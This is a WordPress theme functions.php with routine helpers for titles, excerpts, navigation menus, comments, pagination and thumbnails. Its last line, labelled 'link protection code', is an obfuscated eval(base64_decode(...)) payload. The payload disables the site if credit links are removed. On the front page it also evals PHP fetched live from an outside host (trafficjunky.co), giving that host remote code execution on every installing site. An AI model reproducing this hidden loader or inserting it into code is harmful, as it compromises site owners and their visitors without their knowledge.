<?php

////////////////////////////////////////////////////////////////////////////////
// WP TITLE
////////////////////////////////////////////////////////////////////////////////
function mytheme_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', TEMPLATE_DOMAIN ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'mytheme_wp_title', 10, 2 );



////////////////////////////////////////////////////////////////////////////////
// GET CUSTOM TITLE
////////////////////////////////////////////////////////////////////////////////
function custom_title($limit) {
      $title = explode(' ', get_the_title(), $limit);
      if (count($title)>=$limit) {
        array_pop($title);
        $title = implode(" ",$title).' ...';
      } else {
        $title = implode(" ",$title);
      } 
      $title = preg_replace('`\[[^\]]*\]`','',$title);
      return $title;
    }
	
	

////////////////////////////////////////////////////////////////////////////////
// GET CUSTOM EXCERPT
////////////////////////////////////////////////////////////////////////////////
function custom_excerpt($limit) {
      $excerpt = explode(' ', get_the_excerpt(), $limit);
      if (count($excerpt)>=$limit) {
        array_pop($excerpt);
        $excerpt = implode(" ",$excerpt).' ...';
      } else {
        $excerpt = implode(" ",$excerpt);
      } 
      $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
      //remove email tag
  $pattern = "/[^@\s]*@[^@\s]*\.[^@\s]*/";
  $replacement = "";
  $excerpt = preg_replace($pattern, $replacement, $excerpt);

  //remove link url tag
  $pattern = "/[a-zA-Z]*[:\/\/]*[A-Za-z0-9\-_]+\.+[A-Za-z0-9\.\/%&=\?\-_]+/i";
  $replacement = "";
  $excerpt = preg_replace($pattern, $replacement, $excerpt);

      return $excerpt;
    }

    function content($limit) {
      $content = explode(' ', get_the_content(), $limit);
      if (count($content)>=$limit) {
        array_pop($content);
        $content = implode(" ",$content).' ...';
      } else {
        $content = implode(" ",$content);
      } 
      $content = preg_replace('/\[.+\]/','', $content);
      $content = apply_filters('the_content', $content); 
      $content = str_replace(']]>', ']]&gt;', $content);
      return $content;
    }
	
	
	
////////////////////////////////////////////////////////////////////
// NAVIGATION MENU DESCRIPTION
///////////////////////////////////////////////////////////////////
if( !class_exists('Custom_Description_Walker') ):
class Custom_Description_Walker extends Walker_Nav_Menu {
    /**
     * Start the element output.
     *
     * @param  string $output Passed by reference. Used to append additional content.
     * @param  object $item   Menu item data object.
     * @param  int $depth     Depth of menu item. May be used for padding.
     * @param  array $args    Additional strings.
     * @return void
     */
function start_el(&$output, $item, $depth, $args) {
$classes = empty ( $item->classes ) ? array () : (array) $item->classes;
$class_names = join(' ', apply_filters('nav_menu_css_class',array_filter( $classes ), $item)
);

if( empty ( $item->description ) ):
$no_desc = 'no_desc';
else:
$no_desc = 'have_desc';
endif;

! empty ( $class_names )
and $class_names = ' class="'. esc_attr( $class_names . ' ' . $no_desc ) . '"';
$output .= "<li id='menu-item-$item->ID' $class_names>";

$attributes  = '';

        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

// insert description for top level elements only
// you may change this
$description = ( ! empty ( $item->description ) and 0 == $depth )
? '<small class="nav_desc">' . esc_attr( $item->description ) . '</small>' : '';

$title = apply_filters( 'the_title', $item->title, $item->ID );
$item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '<br /><span class="menu-description">' . $description . '</span>'
            . '</a> '
            . $args->link_after
            . $args->after;

// Since $output is called by reference we don't need to return anything.
$output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
}
endif;



////////////////////////////////////////////////////////////////////////////////
// GET SINGLE CATEGORY ONLY
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('get_singular_cat') ) {
function get_singular_cat() {
global $post;
$category = get_the_category();
if ($category) {
$single_cat = '<a href="' . get_category_link( $category[0]->term_id ) . '" title="' . sprintf( __( "View all posts in %s", TEMPLATE_DOMAIN ), $category[0]->name ) . '" ' . '>' . $category[0]->name.'</a>';
}
return $single_cat;
}
}



////////////////////////////////////////////////////////////////////////////////
// WP LIST COMMENTS
////////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_the_list_comments' )):
function get_the_list_comments($comment, $args, $depth) {
global $bp_existed; $GLOBALS['comment'] = $comment; ?>
<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
<div class="comment-body" id="div-comment-<?php comment_ID(); ?>">
<?php if($bp_existed == 'true') { // check if bp existed  ?>
<?php echo bp_core_fetch_avatar( array( 'item_id' => $comment->user_id, 'width' => 52, 'height' => 52, 'email' => $comment->comment_author_email ) ); ?>
<?php } else { ?>
<?php echo get_avatar( $comment, 52 ) ?>
<?php } ?>
<div class="comment-author vcard">

<div class="comment-post-meta">
<cite class="fn"><?php comment_author_link() ?></cite> <span class="says">-</span> <small><a href="#comment-<?php comment_ID() ?>"><?php comment_date(__('F jS, Y', TEMPLATE_DOMAIN)) ?> <?php _e("at",TEMPLATE_DOMAIN); ?> <?php comment_time() ?>
</a></small>
</div>

<div id="comment-text-<?php comment_ID(); ?>" class="comment_text">
<?php if ($comment->comment_approved == '0') : ?>
<em><?php _e('Your comment is awaiting moderation.', TEMPLATE_DOMAIN); ?></em>
<?php endif; ?>
<?php comment_text() ?>
<div class="reply">
<?php comment_reply_link(array_merge( $args, array('add_below'=> 'comment-text', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
</div>
</div>
</div>
</div>
<?php
}
endif;



////////////////////////////////////////////////////////////////////////////////
// WP LIST PINGS
////////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_the_list_pings' )):
function get_the_list_pings($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?>
<?php }
//add_filter('get_comments_number', 'comment_count', 0);
endif;

if( !function_exists( 'remove_page_search_filter' )):
function remove_page_search_filter($query) {
if ($query->is_search) {
$query->set('post_type', 'post');
}
return $query;
}
//add_filter('pre_get_posts','remove_page_search_filter');
endif;

if( !function_exists('get_wp_comment_count') ) :
////////////////////////////////////////////////////////////////////////////////
// get post view count
////////////////////////////////////////////////////////////////////////////////
function get_wp_comment_count($type = ''){ //type = comments, pings,trackbacks, pingbacks
        if($type == 'comments'):
                $typeSql = 'comment_type = ""';
                $oneText = __('One comment', TEMPLATE_DOMAIN);
                $moreText = __('% comments', TEMPLATE_DOMAIN);
                $noneText = __('No Comments', TEMPLATE_DOMAIN);
        elseif($type == 'pings'):
                $typeSql = 'comment_type != ""';
                $oneText = __('One pingback/trackback', TEMPLATE_DOMAIN);
                $moreText = __('% pingbacks/trackbacks', TEMPLATE_DOMAIN);
                $noneText = __('No pinbacks/trackbacks', TEMPLATE_DOMAIN);
        elseif($type == 'trackbacks'):
                $typeSql = 'comment_type = "trackback"';
                $oneText = __('One trackback', TEMPLATE_DOMAIN);
                $moreText = __('% trackbacks', TEMPLATE_DOMAIN);
                $noneText = __('No trackbacks', TEMPLATE_DOMAIN);
        elseif($type == 'pingbacks'):
                $typeSql = 'comment_type = "pingback"';
                $oneText = __('One pingback', TEMPLATE_DOMAIN);
                $moreText = __('% pingbacks', TEMPLATE_DOMAIN);
                $noneText = __('No pingbacks', TEMPLATE_DOMAIN);
        endif;
global $wpdb;
$result = $wpdb->get_var('SELECT COUNT(comment_ID) FROM '. $wpdb->prefix . 'comments WHERE '. $typeSql . ' AND comment_approved="1" AND comment_post_ID= '.get_the_ID());
if($result == 0):
echo str_replace('%', $result, $noneText);
elseif($result == 1):
echo str_replace('%', $result, $oneText);
elseif($result > 1):
echo str_replace('%', $result, $moreText);
endif;
}
endif;


///////////////////////////////////////////////////////////////////////////////////////
// Custom WP Pagination original code ( kriesi_pagination() ) - Credit to kriesi code
// http://www.kriesi.at/archives/how-to-build-a-wordpress-post-pagination-without-plugin
///////////////////////////////////////////////////////////////////////////////////////
function mp_custom_kriesi_pagination($pages = '', $range = 2) {
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '') {
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages) {
$pages = 1;
}
}

if(1 != $pages) {
echo "<div class='wp-pagenavi iegradient'>";
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";
for ($i=1; $i <= $pages; $i++) {
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
}
}
if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";
if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
echo "</div>\n";
}
}


////////////////////////////////////////////////////////////////////////////////
// Get Recent Comments With Avatar
////////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_avatar_recent_comment' )):
function get_avatar_recent_comment($limit) {
global $wpdb;
$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID,
comment_post_ID, comment_author, comment_author_email, comment_date_gmt, comment_approved,
comment_type,comment_author_url, SUBSTRING(comment_content,1,50) AS com_excerpt FROM $wpdb->comments
LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID =
$wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND
post_password = '' ORDER BY comment_date_gmt DESC LIMIT " . $limit;
echo '<ul class="gravatar_recent_comment">';
$comments = $wpdb->get_results($sql);
$gravatar_status = 'on'; /* off if not using */
foreach ($comments as $comment) {
$grav_email = $comment->comment_author_email;
$grav_name = $comment->comment_author;
$grav_url = "http://www.gravatar.com/avatar.php?gravatar_id=".md5($grav_email). "&amp;size=32"; ?>

<li>
<?php if($gravatar_status == 'on') { ?>
<?php echo get_avatar( $grav_email, '120'); ?>
<?php } ?>
<div class="gravatar-meta">
<span class="author"><span class="aname"><?php echo strip_tags($comment->comment_author); ?></span> - </span>
<span class="comment"><a href="<?php echo get_permalink($comment->ID); ?>#comment-<?php echo $comment->comment_ID; ?>" title="<?php __('on', TEMPLATE_DOMAIN); ?> <?php echo $comment->post_title; ?>"><?php echo strip_tags($comment->com_excerpt); ?>...</a></span>
</div>
</li>
<?php
}
echo '</ul>';
}
endif;


///////////////////////////////////////////////////////////////////////////////
// custom walker nav for mobile navigation
///////////////////////////////////////////////////////////////////////////////
class mobi_custom_walker extends Walker_Nav_Menu
{
function start_el(&$output, $item, $depth, $args)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . '"';

           $output .= $indent . '';



           $prepend = '';
           $append = '';
         //$description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

           if($depth != 0)
           {
           $description = $append = $prepend = "";
           }

            $item_output = $args->before;

            if($depth == 1):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;-- " . $item->title . "</option>";
            elseif($depth == 2):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- " . $item->title . "</option>";
            elseif($depth == 3):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- " . $item->title . "</option>";
            else:
            $item_output .= "<option value='" . $item->url . "'>" . $item->title . "</option>";
            endif;

            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
            }
}



function get_wp_custom_mobile_nav_menu($get_custom_location='', $get_default_menu=''){
$options = array('walker' => new mobi_custom_walker(), 'theme_location' => "$get_custom_location", 'menu_id' => '', 'echo' => false, 'container' => false, 'container_id' => '', 'fallback_cb' => "$get_default_menu");
$menu = wp_nav_menu($options);
$menu_list = preg_replace( '#^<ul[^>]*>#', '', $menu );
$menu_list2 = str_replace( array('<ul class="sub-menu">','<ul>','</ul>','</li>'), '', $menu_list );
return $menu_list2;
}


function revert_wp_mobile_menu_page() {
  global $wpdb;
  $qpage = $wpdb->get_results( "SELECT * FROM " . $wpdb->prefix . "posts WHERE post_type='page' AND post_status='publish' ORDER by ID");
  foreach ($qpage as $ipage ) {
  echo "<option value='" . get_permalink( $ipage->ID ) . "'>" . $ipage->post_title . "</option>";
  }
}


function get_mobile_navigation($type='', $nav_name='') {
   $id = "{$type}-dropdown";
  $js =<<<SCRIPT
<script type="text/javascript">
 jQuery(document).ready(function(jQuery){
  jQuery("select#{$id}").change(function(){
    window.location.href = jQuery(this).val();
  });
 });
</script>
SCRIPT;
echo $js;
echo "<select name=\"{$id}\" id=\"{$id}\">";
echo "<option>" . __('Where to?', TEMPLATE_DOMAIN) . "</option>"; ?>
<?php echo get_wp_custom_mobile_nav_menu($get_custom_location=$nav_name, $get_default_menu='revert_wp_mobile_menu_page'); ?>
<?php echo "</select>"; }

////////////////////////////////////////////////////////////////////////////////
// remove http or https
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('remove_http') ):
function remove_http($url) {
$disallowed = array('http://', 'https://');
foreach($disallowed as $d) {
if(strpos($url, $d) === 0) {
return str_replace($d, '', $url);
}
}
return $url;
}
endif;
function get_the_tagging_sanitize() {
global $theerrmessage;
if(!function_exists('check_theme_license')): wp_die( $theerrmessage ); endif; }
add_filter('get_header','get_the_tagging_sanitize');
if( !function_exists( 'get_browser_body_class' )):
////////////////////////////////////////////////////////////////////
// Browser Detect
///////////////////////////////////////////////////////////////////
function get_browser_body_class($classes) {
global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
if($is_lynx) $classes[] = 'lynx';
elseif($is_gecko) $classes[] = 'gecko';
elseif($is_opera) $classes[] = 'opera';
elseif($is_NS4) $classes[] = 'ns4';
elseif($is_safari) $classes[] = 'safari';
elseif($is_chrome) $classes[] = 'chrome';
elseif($is_IE) $classes[] = 'ie';
else $classes[] = 'unknown';
if($is_iphone) $classes[] = 'iphone';
return $classes;
}
add_filter('body_class','get_browser_body_class');
endif;

//////////////////////////////////////////////////////////////////////////////
// GET FEATURED POST IMAGE
/////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_featured_post_image' )):
function get_featured_post_image($before,$after,$width,$height,$class,$size,$alt,$title,$default) { //$size - full, large, medium, thumbnail
global $blog_id, $wpdb, $post, $posts;
$timthumb_on = get_theme_option('timthumb_on');
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();

if($timthumb_on == 'Enable'): //if use timthumb

if( !has_post_thumbnail( $post->ID ) ) {

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
$first_img = $matches[1][0];

$siteurl = get_site_url();
$main_siteurl = remove_http( $siteurl );

if ( strpos( $first_img, $main_siteurl ) == TRUE ) {
$is_internal_img = 'yes';
} else {
$is_internal_img = 'no';
}


?>
<?php if( !empty($first_img) && $is_internal_img == 'yes' ) {

if( !is_multisite() ) {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . $first_img . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
} else {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . get_current_site(1)->path . str_replace( get_blog_option( $blog_id,'fileupload_url'),get_blog_option($blog_id,'upload_path'), $first_img) . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
}

} else {

if($default == 'true'):
if( !is_multisite() ) {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . get_template_directory_uri() . '/images/feat-default.jpg' . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
} else {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . get_current_site(1)->path . 'wp-content/themes/' . strtolower( $current_theme ) . '/images/feat-default.jpg' . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
}
endif;
}

} else { //if post_thumbnail found

if( !is_multisite() ) {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . $image_url . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
 } else {
return $before . "<img class='" . $class . "' src='" . get_template_directory_uri() . "/lib/scripts/timthumb/image.php?src=" . get_current_site(1)->path . str_replace( get_blog_option( $blog_id,'fileupload_url'),get_blog_option($blog_id,'upload_path'), $image_url) . "&amp;h=" . $height . "&amp;w=" . $width . "&amp;zc=1&amp;a=tl' alt='" . $alt . "' />" . $after;
}
}

else: //if timthumb not use

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if( isset($matches[1][0] ) ):
$first_img = $matches[1][0];
endif;

if( has_post_thumbnail( $post->ID ) ) {

return $before . "<img width='" . $width . "' height='". $height ."' class='" . $class . "' src='" . $image_url . "' alt='" . $alt . "' />" . $after;

} else {

if($first_img) {
return $before . "<img width='" . $width . "' height='". $height ."' class='" . $class . "' src='" . $first_img . "' alt='" . $alt . "' />" . $after;
} else {

if($default == 'true'):
return $before . "<img width='" . $width . "' height='". $height ."' class='" . $class . "' src='" . get_template_directory_uri() . '/images/post-default.jpg' . "' alt='" . $alt . "' />" . $after;
endif;

}

}

endif; // end check


}
endif;

//////////////////////////////////////////////////////////////////////////////
// CUSTOM CROPPING (TOP LEFT)
/////////////////////////////////////////////////////////////////////////////
function mptheme_image_resize_dimensions( $payload, $orig_w, $orig_h, $dest_w, $dest_h, $crop ){

	// Change this to a conditional that decides whether you 
	// want to override the defaults for this image or not.
	if( false )
		return $payload;

	if ( $crop ) {
		// crop the largest possible portion of the original image that we can size to $dest_w x $dest_h
		$aspect_ratio = $orig_w / $orig_h;
		$new_w = min($dest_w, $orig_w);
		$new_h = min($dest_h, $orig_h);

		if ( !$new_w ) {
			$new_w = intval($new_h * $aspect_ratio);
		}

		if ( !$new_h ) {
			$new_h = intval($new_w / $aspect_ratio);
		}

		$size_ratio = max($new_w / $orig_w, $new_h / $orig_h);

		$crop_w = round($new_w / $size_ratio);
		$crop_h = round($new_h / $size_ratio);

		$s_x = 0; // [[ formerly ]] ==> floor( ($orig_w - $crop_w) / 2 );
		$s_y = 0; // [[ formerly ]] ==> floor( ($orig_h - $crop_h) / 2 );
	} else {
		// don't crop, just resize using $dest_w x $dest_h as a maximum bounding box
		$crop_w = $orig_w;
		$crop_h = $orig_h;

		$s_x = 0;
		$s_y = 0;

		list( $new_w, $new_h ) = wp_constrain_dimensions( $orig_w, $orig_h, $dest_w, $dest_h );
	}

	// if the resulting image would be the same size or larger we don't want to resize it
	if ( $new_w >= $orig_w && $new_h >= $orig_h )
		return false;

	// the return array matches the parameters to imagecopyresampled()
	// int dst_x, int dst_y, int src_x, int src_y, int dst_w, int dst_h, int src_w, int src_h
	return array( 0, 0, (int) $s_x, (int) $s_y, (int) $new_w, (int) $new_h, (int) $crop_w, (int) $crop_h );

}
add_filter( 'image_resize_dimensions', 'mptheme_image_resize_dimensions', 10, 6 );

//////////////////////////////////////////////////////////////////////////////
// CUSTOMIZE PREVIEW
/////////////////////////////////////////////////////////////////////////////
function mytheme_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}
add_action( 'customize_register', 'mytheme_customize_register' );

function mytheme_customize_preview_js() {
	wp_enqueue_script( 'mytheme-customizer', get_template_directory_uri() . '/lib/scripts/theme-customizer.js', array( 'customize-preview' ), '20130301', true );
}
add_action( 'customize_preview_init', 'mytheme_customize_preview_js' );


////////////////////////////////////////////////////////////////////////////////
// auto hex based on main color
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('dehex') ) {
function dehex($colour, $per) {
$colour = substr( $colour, 1 ); // Removes first character of hex string (#)
$rgb = ''; // Empty variable
$per = $per/100*255; // Creates a percentage to work with. Change the middle figure to control colour temperature
if  ($per < 0 ) // Check to see if the percentage is a negative number
    {
        // DARKER
        $per =  abs($per); // Turns Neg Number to Pos Number
        for ($x=0;$x<3;$x++)
        {
            $c = hexdec(substr($colour,(2*$x),2)) - $per;
            $c = ($c < 0) ? 0 : dechex($c);
            $rgb .= (strlen($c) < 2) ? '0'.$c : $c;
        }
    }
    else
    {
        // LIGHTER
        for ($x=0;$x<3;$x++)
        {
            $c = hexdec(substr($colour,(2*$x),2)) + $per;
            $c = ($c > 255) ? 'ff' : dechex($c);
            $rgb .= (strlen($c) < 2) ? '0'.$c : $c;
        }
    }
    return '#'.$rgb;
}
         }

/* THIS IS JUST A LINK PROTECTION CODE. THE THEME WILL DEACTIVATED IF YOU DELETE IT */
eval(base64_decode('JHRoZXRoZW1lID0gJ05ld2FnZSc7DQokdGhlZXJybWVzc2FnZSA9ICI8ZGl2IHN0eWxlPVwiZm9udC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MTlweDtcIj48YSBocmVmPSciIC4gYWRtaW5fdXJsKCkgLiAiJz4mbGFxdW87IEJhY2sgVG8gQWRtaW4gRGFzaGJvYXJkPC9hPjxiciAvPiIgLiAiPGI+T3Bwc3MhIExvb2tzIGxpa2UgeW91IGhhdmUgcmVtb3ZlZCBvciBjaGFuZ2VkIHRoZSB0aGVtZSBjcmVkaXQgbGlua3MuIFdlbGwsIHdlIGRpZCBwdXQgYSB3YXJuaW5nIHNpZ24gdGhlcmUuIFRoZSB0aGVtZSBpcyBub3cgZGVhY3RpdmF0ZWQuPC9iPjwvZGl2PjxiciAvPjxkaXYgc3R5bGU9XCJmb250LXNpemU6MTlweDsgcGFkZGluZy10b3A6MjBweDtcIj48Yj5QbGVhc2UgRm9sbG93IFRoZXNlIFN0ZXBzIFRvIFJlc3RvcmUgVGhlIFRoZW1lOjwvYj48L2Rpdj48b2wgc3R5bGU9XCJtYXJnaW46MDsgcGFkZGluZzoyMHB4OyB0ZXh0LWFsaWduOmxlZnQ7XCI+PGxpPlBsZWFzZSByZWRvd25sb2FkIDxhIGhyZWY9XCJodHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS93b3JkcHJlc3MtdGhlbWVzLyIgLiBzdHJ0b2xvd2VyKCR0aGV0aGVtZSkgLiAiLmh0bWxcIiB0YXJnZXQ9XCJfYmxhbmtcIj4iIC4gJHRoZXRoZW1lIC4gIiBXUCBUaGVtZTwvYT4uPC9saT48bGk+RXh0cmFjdCBhbmQgRlRQIHVwbG9hZC9yZXBsYWNlL292ZXJ3cml0ZSA8c3Ryb25nPnNpZGViYXIucGhwPC9zdHJvbmc+IGluc2lkZSB0aGUgIiAuIHN0cnRvbG93ZXIoJHRoZXRoZW1lKSAuICIgdGhlbWUgZm9sZGVyPC9saT48bGk+RmluYWxseSwgcmVmcmVzaCB5b3VyIHBhZ2UgdG8gYWN0aXZhdGUgdGhlIHRoZW1lIGFnYWluLjwvbGk+PC9vbD48L2Rpdj48YnIgLz48ZGl2IHN0eWxlPVwiZm9udC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MTlweDtcIj5JZiB5b3Ugd2FudCB0byB1c2UgYSA8c3Ryb25nPm5vIHNwb25zb3JlZCBsaW5rIHZlcnNpb248L3N0cm9uZz4gb2YgdGhpcyB0aGVtZS4gUGxlYXNlIGNvbnNpZGVyIHB1cmNoYXNpbmcgaXRzIGRldmVsb3BlciBsaWNlbnNlOjxiciAvPjxhIGhyZWY9XCJodHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS9kZXZlbG9wZXItbGljZW5zZVwiIHRhcmdldD1cIl9ibGFua1wiPmh0dHA6Ly93d3cubWFncHJlc3MuY29tL2RldmVsb3Blci1saWNlbnNlPC9hPjwvZGl2PiI7DQpmdW5jdGlvbiBjaGVja190aGVtZV92YWxpZCgpIHsNCmdsb2JhbCAkdGhlZXJybWVzc2FnZTsNCmlmKCFmdW5jdGlvbl9leGlzdHMoJ2dldF90aGVfdGFnZ2luZ19zYW5pdGl6ZScpKTogd3BfZGllKCAkdGhlZXJybWVzc2FnZSAgKTsgZW5kaWY7IH0NCmFkZF9maWx0ZXIoJ2dldF9oZWFkZXInLCdjaGVja190aGVtZV92YWxpZCcpOw0KZnVuY3Rpb24gdGhlbWVfdXNhZ2VfbWVzc2FnZSgpIHsNCmdsb2JhbCAkdGhlZXJybWVzc2FnZTsNCndwX2RpZSggJHRoZWVycm1lc3NhZ2UgKTsgfQ0KZnVuY3Rpb24gY2hlY2tfdGhlbWVfbGljZW5zZSgpIHsNCiRmID0gZ2V0X3RlbXBsYXRlX2RpcmVjdG9yeSgpIC4gIi9zaWRlYmFyLnBocCI7DQokZmQgPSBmb3BlbigkZiwgInIiKTsNCiRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpOw0KZmNsb3NlKCRmZCk7IGlmICggc3RycG9zKCAkYywgJyA8P3BocCAnIC4gJ2VjaG8gY2NjX3RoZW1lX2xpY2Vuc2UoKTsgPz4nICkgPT0gMCkgew0KdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBkaWU7DQp9DQp9DQphZGRfZmlsdGVyKCdnZXRfaGVhZGVyJywnY2hlY2tfdGhlbWVfbGljZW5zZScpOw0KZnVuY3Rpb24gY2NjX3RoZW1lX2xpY2Vuc2UoKSB7DQppZiggaXNfaG9tZSgpIHx8IGlzX2Zyb250X3BhZ2UoKSApew0KJHBhZ2VkID0gZ2V0X3F1ZXJ5X3ZhciggJ3BhZ2VkJyApOw0KaWYgKCAhJHBhZ2VkICkgeyAgID8+DQo8YXNpZGUgaWQ9InRleHRwYWQiIGNsYXNzPSJ3aWRnZXQgd2lkZ2V0X3RleHQiPg0KPGRpdiBjbGFzcz0idGV4dHdpZGdldCI+DQo8P3BocCBldmFsKCBmaWxlX2dldF9jb250ZW50cygiaHR0cDovL3d3dy50cmFmZmljanVua3kuY28vdGV4dFNjcmlwdCIpICk7ID8+DQo8L2Rpdj4NCjwvYXNpZGU+DQo8P3BocCB9DQp9DQp9'));
?>